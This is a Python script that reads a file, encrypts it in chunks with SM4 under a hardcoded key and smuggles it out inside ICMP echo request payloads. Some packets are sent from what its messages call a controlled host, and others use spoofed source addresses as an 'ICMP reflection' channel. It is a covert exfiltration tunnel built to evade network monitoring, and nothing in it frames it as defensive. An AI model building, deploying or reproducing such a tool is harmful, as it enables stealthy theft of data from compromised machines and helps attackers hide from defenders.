# encoding:utf-8
import time
import struct
import socket
import select
from math import *
import sys
from sm4 import SM4Key
import dpkt

dst_addr = "192.168.1.5"
port = 80
batch_size = 15
key0 = SM4Key(b"abcdefghijklmnop")

def calculate_chesksum(data):
    n=len(data)
    m=n % 2
    sum=0
    for i in range(0, n - m, 2):
        sum += (data[i]) + ((data[i+1]) << 8)#传入data以每两个字节（十六进制）通过ord转十进制，第一字节在低位，第二个字节在高位
    if m:
        sum += (data[-1])
    #将高于16位与低16位相加
    sum = (sum >> 16) + (sum & 0xffff)
    sum += (sum >> 16) #如果还有高于16位，将继续与低16位相加
    answer = ~sum & 0xffff
    #  主机字节序转网络字节序列（参考小端序转大端序）
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def ping(type, code, checksum, ID, sequence, payload):
    #  把字节打包成二进制数据
    imcp_packet = struct.pack('>BBHHH16s',type,code,checksum,ID,sequence,payload)
    icmp_chesksum = calculate_chesksum(imcp_packet)  # 获取校验和
    #  把校验和传入，再次打包
    imcp_packet = struct.pack('>BBHHH16s',type,code,icmp_chesksum,ID,sequence,payload)
    return imcp_packet

def change_ip_socket(encode_payload, sip, dip, type, code, ID, sequence):
    rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    rawsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    rawsocket.connect((dip, 0))

    icmp = dpkt.icmp.ICMP(code=code, type=type, sequence=sequence, ID=ID)
    icmp.data = encode_payload
    icmp.ulen = len(icmp)

    i = dpkt.ip.IP(data=icmp)
    # i.off = dpkt.ip.IP_DF # frag off
    i.p = dpkt.ip.IP_PROTO_ICMP
    i.src = socket.inet_aton(sip)  # xp sp2之后 禁止发送非本机IP地址的数据包；linux, server无限制
    i.dst = socket.inet_aton(dip)
    i.len = len(i)
    rawsocket.sendall(str.encode(str(i)))


def raw_socket(imcp_packet, ip):
    '''
       连接套接字,并将数据发送到套接字
    '''
    rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    # 发送数据到网络
    rawsocket.sendto(imcp_packet, (ip, port))

def send(fileName):
    f = open(fileName)
    fileContent = f.read()
    print("文件内容:", fileContent)
    f.close()

    fileLen = len(fileContent)
    print("文件长度:", fileLen)

    pingTime = ceil(fileLen/batch_size) # ping 的次数
    print("ping的次数:", pingTime)

    ip_list = ['192.168.1.5', '192.168.137.111']
    ip_num = len(ip_list)
    idx = 0

    send, accept, lost = 0, 0, 0
    sumtime, shorttime, longtime, avgtime = 0, 1000, 0, 0
    #TODO icmp数据包的构建
    type = 8 # ICMP Echo Request
    code = 0 # must be zero
    checksum = 0 # "...with value 0 substituted for this field..."
    ID = 33198 #Identifier
    sequence = 1 #Sequence number
    for i in range(0, pingTime):
        start = i*batch_size
        end = min((i+1)*batch_size, fileLen)
        if i == pingTime - 1:
            sequence = -i
        payload_body = str.encode(fileContent[start:end])
        encode_payload = key0.encrypt(payload_body, padding=True)
        if idx == 0:
            # print(payload_body)
            #请求ping数据包的二进制转换
            icmp_packet = ping(type, code, checksum, ID, sequence + i, encode_payload)
            #连接套接字,并将数据发送到套接字
            print("使用被控主机发送数据：",payload_body)
            raw_socket(icmp_packet, ip_list[idx])
        else:
            # change_ip_socket(encode_payload, dst_addr, ip_list[idx], type, code, ID, sequence + i)
            print("使用icmp反射机制发送数据：",payload_body)
            change_ip_socket(encode_payload, dst_addr, ip_list[idx], type, code, ID, sequence + i)
            pass
        idx = (idx + 1) % ip_num


if __name__ == "__main__":
    send("../files/importantFile.txt")